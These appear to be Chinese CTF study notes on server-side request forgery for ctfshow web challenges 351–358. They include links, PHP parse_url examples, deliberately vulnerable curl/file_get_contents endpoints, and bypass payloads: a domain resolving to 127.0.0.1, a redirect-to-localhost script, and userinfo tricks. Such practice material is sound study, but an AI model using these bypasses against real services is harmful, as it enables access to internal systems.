ssrf 知识<br/>
Gopherus工具

<a href="https://ctf-wiki.org/web/ssrf/">ctfwiki ssrf</a>
<a href="https://www.freebuf.com/articles/web/260806.html">ssrf 从0到1</a>

<a href="https://blog.csdn.net/qq_50589021/article/details/120183781">ctfshow ssrf wp</a>


<a href="https://www.cnblogs.com/tr1ple/p/11137159.html">parse_url</a>

```php
						 parse_url()  
						 
<?php
$url = 'http://username:password@hostname/path?arg=value#anchor';
print_r(parse_url($url));
echo parse_url($url, PHP_URL_PATH);
?>
结果----------------------------------------------------------------------------------------------------
Array
(
    [scheme] => http
    [host] => hostname			//
    [user] => username			@前
    [pass] => password			@前
    [path] => /path				/
    [query] => arg=value		?以后的key=value
    [fragment] => anchor		#以后的部分
)
	/path
```
```php
<?php
$url = 'http://ctf.@127.0.0.1/flag.php?show';
$x = parse_url($url);
var_dump($x);
?>

//运行结果:
array(5) {
  ["scheme"]=>
  string(4) "http"
  ["host"]=>
  string(9) "127.0.0.1"
  ["user"]=>
  string(4) "ctf."
  ["path"]=>
  string(9) "/flag.php"
  ["query"]=>
  string(4) "show"
}
```




web 351
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$ch=curl_init($url);//初始化 cURL 会话
curl_setopt($ch, CURLOPT_HEADER, 0);//启用时会将头文件的信息作为数据流输出。
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);//将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。
$result=curl_exec($ch);//执行 cURL 会话
curl_close($ch);//关闭 cURL 会话
echo ($result);
?>
```

web352
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);//解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。
if($x['scheme']==='http'||$x['scheme']==='https'){//或
if(!preg_match('/localhost|127.0.0/')){//这里应该设置匹配的对象
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
```

web354
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|1|0|。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?>
```
payload:
```php
奇淫巧技：将域名A类指向127.0.0.1
http(s)://sudo.cc/指向127.0.0.1

url=http://sudo.cc/flag.php

也可以
<?php header("Location: http://127.0.0.1/flag.php");
# POST: url=http://your-domain/ssrf.php
```

web357
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$ip = gethostbyname($x['host']);
echo '</br>'.$ip.'</br>';
if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    die('ip!');
}


echo file_get_contents($_POST['url']);
}
else{
    die('scheme');
}
?>
```
payload
```php
需要有自己的vps
```

web 358
```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if(preg_match('/^http:\/\/ctf\..*show$/i',$url)){
    echo file_get_contents($url);
}
```